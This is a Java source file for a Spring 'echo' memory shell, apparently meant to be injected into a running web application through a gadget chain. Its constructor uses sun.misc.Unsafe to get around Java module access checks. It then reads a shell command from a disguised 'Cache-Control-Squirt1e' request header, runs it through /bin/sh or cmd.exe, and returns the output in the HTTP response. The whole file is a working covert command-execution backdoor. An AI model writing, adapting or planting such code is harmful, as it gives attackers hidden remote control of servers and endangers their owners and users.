package gadget.memshell;

import java.io.InputStream;
import java.io.Writer;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.Scanner;
import sun.misc.Unsafe;
public class SpringEcho {
    private String getReqHeaderName() {
        return "Cache-Control-Squirt1e";
    }
    public SpringEcho() throws Exception {
        try {
            Class unsafeClass = Class.forName("sun.misc.Unsafe");
            Field unsafeField =
                    unsafeClass.getDeclaredField("theUnsafe");
            unsafeField.setAccessible(true);
            Unsafe unsafe = (Unsafe)unsafeField.get((Object)null);
            Method getModuleMethod =
                    Class.class.getDeclaredMethod("getModule");
            Object module = getModuleMethod.invoke(Object.class);
            Class cls = SpringEcho.class;
            long offset =
                    unsafe.objectFieldOffset(Class.class.getDeclaredField("module"));
            unsafe.getAndSetObject(cls, offset, module);
        } catch (Exception var9) {
        }
        this.run();
    }
    public void run() {
        ClassLoader classLoader =
                Thread.currentThread().getContextClassLoader();
        try {
            Object requestAttributes =
                    this.invokeMethod(classLoader.loadClass("org.springframework.web.context.request.RequestContextHolder"), "getRequestAttributes");
                            Object request = this.invokeMethod(requestAttributes,
                                    "getRequest");
            Object response = this.invokeMethod(requestAttributes,
                    "getResponse");
            Method getHeaderM =
                    request.getClass().getMethod("getHeader", String.class);
            String cmd = (String)getHeaderM.invoke(request,
                    this.getReqHeaderName());
            if (cmd != null && !cmd.isEmpty()) {
                Writer writer = (Writer)this.invokeMethod(response,
                        "getWriter");
                writer.write(this.exec(cmd));
                writer.flush();
                writer.close();
            }
        } catch (Exception var8) {
        }
    }
    private String exec(String cmd) {
        try {
            boolean isLinux = true;
            String osType = System.getProperty("os.name");
            if (osType != null &&
                    osType.toLowerCase().contains("win")) {
                isLinux = false;
            }
            String[] cmds = isLinux ? new String[]{"/bin/sh", "-c",
                    cmd} : new String[]{"cmd.exe", "/c", cmd};
            InputStream in =
                    Runtime.getRuntime().exec(cmds).getInputStream();
            Scanner s = (new Scanner(in)).useDelimiter("\\a");
            String execRes;
            for(execRes = ""; s.hasNext(); execRes = execRes +
                    s.next()) {
            }
            return execRes;
        } catch (Exception var8) {
            Exception e = var8;
            return e.getMessage();
        }
    }
    private Object invokeMethod(Object targetObject, String
            methodName) throws NoSuchMethodException, IllegalAccessException,
            InvocationTargetException {
        return this.invokeMethod(targetObject, methodName, new
                Class[0], new Object[0]);
    }
    private Object invokeMethod(Object obj, String methodName,
                                Class[] paramClazz, Object[] param) throws NoSuchMethodException,
            InvocationTargetException, IllegalAccessException {
        Class clazz = obj instanceof Class ? (Class)obj :
                obj.getClass();
        Method method = null;
        Class tempClass = clazz;
        while(method == null && tempClass != null) {
            try {
                if (paramClazz == null) {
                    Method[] methods =
                            tempClass.getDeclaredMethods();
                    for(int i = 0; i < methods.length; ++i) {
                        if (methods[i].getName().equals(methodName)
                                && methods[i].getParameterTypes().length == 0) {
                            method = methods[i];
                            break;
                        }
                    }
                } else {
                    method = tempClass.getDeclaredMethod(methodName,
                            paramClazz);
                }
            } catch (NoSuchMethodException var12) {
                tempClass = tempClass.getSuperclass();
            }
        }
        if (method == null) {
            throw new NoSuchMethodException(methodName);
        } else {
            method.setAccessible(true);
            if (obj instanceof Class) {
                try {
                    return method.invoke((Object)null, param);
                } catch (IllegalAccessException var10) {
                    throw new RuntimeException(var10.getMessage());
                }
            } else {
                try {
                    return method.invoke(obj, param);
                } catch (IllegalAccessException var11) {
                    throw new RuntimeException(var11.getMessage());
                }
            }
        }
    }
}